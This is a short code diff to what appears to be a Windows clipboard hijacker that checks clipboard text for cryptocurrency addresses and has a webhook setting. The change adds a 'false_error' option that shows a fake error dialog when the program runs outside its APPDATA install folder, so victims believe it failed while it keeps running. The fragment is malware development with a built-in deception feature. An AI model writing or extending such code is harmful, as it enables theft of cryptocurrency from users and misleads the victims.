@@ -33,6 +33,7 @@ k32 = ctypes.WinDLL('kernel32')
 single_use = False
 ping = False
 incubate = False
+false_error = False
 
 webhook_url = ""
 
@@ -82,6 +83,9 @@ def is_crypto_addr(clipboard_text):
         return False
 
 def main():
+    if false_error:
+        if cwd != str(os.path.join(os.environ['APPDATA'], "CLPPTH")):
+            ctypes.windll.user32.MessageBoxW(0, "An error has occurred!", "Error", 0x10)
     while True:
         try:
             startupinfo = subprocess.STARTUPINFO()
